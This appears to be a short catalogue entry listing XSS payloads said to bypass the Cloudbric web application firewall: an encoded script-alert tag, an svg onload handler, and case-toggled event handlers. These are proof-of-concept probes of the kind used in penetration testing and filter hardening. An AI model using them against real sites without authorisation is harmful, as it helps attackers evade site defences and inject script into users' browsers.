---
id: WAF-BYPASS-022
title: Cloudbric WAF Bypass Payloads
category: Known Bypasses
severity_range: Medium-Critical
---

# Cloudbric WAF Bypass Payloads

## XSS Bypasses

1. `<script>alert(1)</script>` with encoding
2. `<svg onload=alert(1)>`
3. Case-toggled event handlers
